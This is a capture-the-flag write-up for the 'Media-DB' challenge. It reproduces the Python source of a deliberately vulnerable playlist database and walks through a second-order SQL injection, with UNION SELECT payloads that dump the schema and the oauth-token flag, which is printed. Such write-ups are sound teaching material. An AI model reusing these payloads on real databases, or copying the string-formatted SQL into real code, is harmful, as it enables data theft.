# Media-DV
Misc.

## Description:
> The gatekeeper software gave you access to a custom database to organize a music playlist. It looks like it might also be connected to the smart fridge to play custom door alarms. Maybe we can grab an oauth token that gets us closer to cake.
> 
> media-db.ctfcompetition.com 1337

```python
#!/usr/bin/env python2.7

import sqlite3
import random
import sys

BANNER = "=== Media DB ==="
MENU = """\
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit"""

with open('oauth_token') as fd:
  flag = fd.read()

conn = sqlite3.connect(':memory:')
c = conn.cursor()

c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
c.execute("CREATE TABLE media (artist text, song text)")
c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))

def my_print(s):
  sys.stdout.write(s + '\n')
  sys.stdout.flush()

def print_playlist(query):
  my_print("")
  my_print("== new playlist ==")
  for i, res in enumerate(c.execute(query).fetchall()):
    my_print('{}: "{}" by "{}"'.format(i+1, res[1], res[0]))
  my_print("")

my_print(BANNER)

while True:
  my_print(MENU)
  sys.stdout.write("> ")
  sys.stdout.flush()
  choice = raw_input()
  if choice not in ['1', '2', '3', '4', '5']:
    my_print('invalid input')
    continue
  if choice == '1':
    my_print("artist name?")
    artist = raw_input().replace('"', "")
    my_print("song name?")
    song = raw_input().replace('"', "")
    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
  elif choice == '2':
    my_print("artist name?")
    artist = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
  elif choice == '3':
    my_print("song name?")
    song = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
  elif choice == '4':
    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
    my_print("choosing songs from random artist: {}".format(artist))
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
  else:
    my_print("bye")
    exit(0)

```

## Solution:

I missed the fact that the source code was attached to the challenge and treated this as a black box exploit.

First, input an apostrophe and leak the vulnerable query.

```console
root@kali:/media/sf_CTFs/google/media# nc media-db.ctfcompetition.com 1337
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
'
song name?
'
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: '

== new playlist ==
Traceback (most recent call last):
  File "./media-db.py", line 76, in <module>
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
  File "./media-db.py", line 45, in print_playlist
    for i, res in enumerate(c.execute(query).fetchall()):
sqlite3.OperationalError: unrecognized token: "'''"
```

Leak the tables:
```console
root@kali:/media/sf_CTFs/google/media# nc media-db.ctfcompetition.com 1337
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
test' UNION SELECT name, name FROM sqlite_master WHERE type='table
song name?
a
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: test' UNION SELECT name, name FROM sqlite_master WHERE type='table

== new playlist ==
1: "media" by "media"
2: "oauth_tokens" by "oauth_tokens"

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
```

Leak the table structure:
```console
root@kali:/media/sf_CTFs/google/media# nc media-db.ctfcompetition.com 1337
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
' UNION SELECT sql, sql FROM sqlite_master WHERE tbl_name = 'oauth_tokens' AND type = 'table
song name?
a
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: ' UNION SELECT sql, sql FROM sqlite_master WHERE tbl_name = 'oauth_tokens' AND type = 'table

== new playlist ==
1: "CREATE TABLE oauth_tokens (oauth_token text)" by "CREATE TABLE oauth_tokens (oauth_token text)"

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
>
```

Get the flag:
```console
> root@kali:/media/sf_CTFs/google/media# nc media-db.ctfcompetition.com 1337
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
test' UNION SELECT oauth_token, oauth_token FROM oauth_tokens --
song name?
a
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: test' UNION SELECT oauth_token, oauth_token FROM oauth_tokens --

== new playlist ==
1: "CTF{fridge_cast_oauth_token_cahn4Quo}
" by "CTF{fridge_cast_oauth_token_cahn4Quo}
"

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
```

The flag: CTF{fridge_cast_oauth_token_cahn4Quo}